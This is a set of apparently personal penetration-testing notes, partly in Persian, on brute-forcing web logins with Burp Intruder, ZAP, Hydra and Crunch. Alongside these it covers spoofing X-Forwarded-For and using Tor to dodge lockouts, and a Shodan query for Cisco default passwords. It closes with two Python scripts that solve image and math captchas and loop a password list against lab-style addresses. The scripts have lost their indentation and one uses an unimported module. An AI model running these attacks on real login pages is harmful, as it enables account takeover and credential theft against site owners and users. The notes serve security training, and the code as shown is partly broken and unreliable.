#  Brute Force

## Exploit
- باید به دنبال رفتار متفاوت برنامه در مواجه با نام کاربری و رمز عبور اشتباه بگردیم
  - صدور پیام خطای متفاوت برای نام کاربری غلط و رمز عبور غلط 
    - یکی از راه های بررسی پیغام خطای متفاوت، بررسی طول متفاوت پاسخ ها می باشد
    - اگر تفاوت تابلو باشد از بخش Grep-Match استفاده کرده و نام کاربری درست را پیدا می کنیم، سپس با استفاده از کد پاسخ 302 رمز عبور درست را می یابیم
    - اگر تفاوت جزئی بود (مثلا یه نقطه کمتر بیشتر)، از Grep-Extract استفاده کرده که response را fetch می کند و همان جا می توانیم هایلایت کنیم
  - زمان پاسخ طولانی تر برای نام کاربری درست
    - ل
- اگر به ازای درخواست زیاد روی IP بلاک کند، باید هدر ```X-Forwarded-For``` را به درخواست اضافه کرده و حمله را در حالت *Pitchfork* انجام داده و تنظیمات زیر را برای این هدر اعمال کنیم
  -  



- بررسی می کنیم که پیغام خطای نام کاربری اشتباه و پسورد اشتباه، یکسان می باشد یا خیر
- برای یافتن user/pass درست از موارد زیر استفاده می کنیم :
  - کد پاسخ redirect مانند 302
  - طول متفاوت در response
  - بخش Grep-Match که به دنبال یک string درون پاسخ می گردد
  - بخش Grep-Extract که response را fetch کرده و همان جا می توانیم بخشی که می خواهیم را هایلایت کنیم
    - اگر تفاوت در خطای نام کاربری و رمز عبور اشتباه جزئی باشد، (مثلا در یک نقطه انتهای عبارت invalid username and password.) از این بخش استفاده کرده و با زدن Add، بخش خطای صادر شده را هایلات کرده و درون Warning ها به دنبال تفاوت می گردیم



## Burp
- Send request to Intruder
- Decode user/pass in the request
  - Right-click on the value and select "Convert selection > Base64 > Base64-decode"
  - The credentials passed to the login prompt are shown => test:123
- Replace the credentials with a parameter to be substituted => creds
- Click on the Add$ Button on the right side
- Navigate to the Payloads tab and load the 100-common-passwords.txt list
- In the Payload Processing section click on the "Add" button
- Select "Add Prefix" & Set the Prefix to "admin:"
  - Now "admin:" would be appended to each password from the list 
- Add another Payload Processing option to encode the payload to base64 
  - Select the Encode Rule as Base64-encode 
- Click on the "Start Attack" button 
- Check the Status codes of the requests and check the payload for the request with a different status code => 301
- Double click on the request entry
- Select the credentials in the Authorization header field and send them to the Decoder tab

## ZAProxy
- Click on "Manual Explore", enter the target IP address in the Input field and click on "Launch Browser" => A browser session will be started with ZAP HUD
- Click on "Continue to your target"
- Attempt login with invalid credentials => The website and the login page action will be added to the sitemap
- Click on the POST request from the sitemap and click on the "Request" tab
- Right click on the POST request, navigate to Attack and click on "Fuzz" => The Fuzzer window will appear
- Select the entered username "john" and click on the Add button => The payloads window will appear
- Click on the Add button, enter the payloads for username. Click on the Add button => Payloads: admin,bee 
- Click on the "OK" button => The payload will appear in the Fuzz Locations
- Similarly, select the entered password "doe" and click on the Add button => The payloads window will appear
- Click on the Add button, enter the payloads for password. Click on the Add button => Payloads: admin, password, adminpasswd, cookie, hello, world, bug, bee
- Click on the OK button => The payload will appear in the Fuzz Locations
- Click on Start Fuzzer. Upon completion of the attack, compare the status code => One of the status code will be 302


## Hydra (Brute force)
- ```hydra -L usernames -P passwords 192.208.137.3 http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"```
  - ```-L```: usernames file
  - ```-P```: password file 
  - ```^USER^``` placeholder will take in the username from the list
  - ```^PASS^``` placeholder will take in the password from the list

## Crunch (Wordlist generator)
- Syntax
  - ```crunch [min]  [max] [characters] -t [pattern] -o [filename]```
- Example
  - ```crunch 6 8 123abc$ -i wordlist -t a@@@@b```
  - ```crunch 6 8 abc12 -o test.txt```

## Wordlists
- ftp://ftp.openwall.com/pub/wordlists/
- https://github.com/berzerk0/Probable-Wordlists
- http://www.openwall.com/mirrors/
- http://www.outpost9.com/files/WordLists.html
- http://www.vulnerabilityassessment.co.uk/passwords.htm
- http://packetstormsecurity.org/Crackers/wordlists/
- http://www.ai.uga.edu/ftplib/natural-language/moby/
- http://wordlist.sourceforge.net/


# Broken Authentication

## User Enumeration
- Burp => Intuder => Grep & Match: ```Incorrect```

## Password Attack
- Burp => Intruder => Attack type: Cluster Bomb

## Default Password
- Shodan => ```net:"77.36.0.0/16" cisco default password```

## Weak Lock Out Mechanism
- استفاده از قفل بازه زمانی
- Bypass with Tor

## Weaker Authentication in Alternative Channel
- Check Mobile app functionality to bypass Web app

## Image Captcha Bypass
- Extract text of image captcha, and brute force the login page
- The image tag is: ```<img id="captcha-image" src="<datauri>"></img>```
- The incorrect attempts can be identified by the "Error!" string.
- Pyton script:
  - fetch the captcha datauri and the cookie from the webpage
  - use the tesseract python module to retrieve the text from the captcha
  - iterate over the password list and send a POST request to the login endpoint along with the required POST parameters
```Python
from PIL import Image
import base64
import pytesseract
import io
import re
import requests
session = requests.Session()
regex = '<img id="captcha-image" src="(.*?)"></img>'
with open('passwords.txt','r') as f:
for password in f:
password = password.rstrip()
response = session.get('http://192.232.252.3')
output = re.search(regex, response.text)
cookies=session.cookies.get_dict()
imgstring = output.group(1).split('base64,')[-1].strip()
image_string = io.BytesIO(base64.b64decode(imgstring))
image = Image.open(image_string)
captcha=pytesseract.image_to_string(image)
print("Trying Password: "+password)
data={"username":"admin","password":password,"captcha":captcha}
output=session.post('http://192.232.252.3/login', cookies=cookies,data=data)
if("Error" not in output.text):
print("Password Found: "+password)
break
time.sleep(0.250)
```

## Math Captcha Bypass
- Extract sum of image captcha equation, and brute force the login page
- The captcha is generated between the tag: ```<h5 style="text-align: center;margin-top: 4px"> and </h5>```
- The incorrect attempts can be identified by the "Error!" string
```Python
import re
import requests
session = requests.Session()
regex = '<h5 style="text-align: center;margin-top: 4px">(.*?) = </h5>'
with open('passwords.txt','r') as f:
for password in f:
password = password.rstrip()
response = session.get('http://192.133.218.3')
output = re.search(regex, response.text)
cookies=session.cookies.get_dict()
captcha=eval(output.group(1))
print("Trying Password: "+password)
data={"username":"admin","password":password,"captcha":captcha}
output=session.post('http://192.133.218.3/login', cookies=cookies,data=data)
if("Error" not in output.text):
print("Password Found: "+password)
break
```

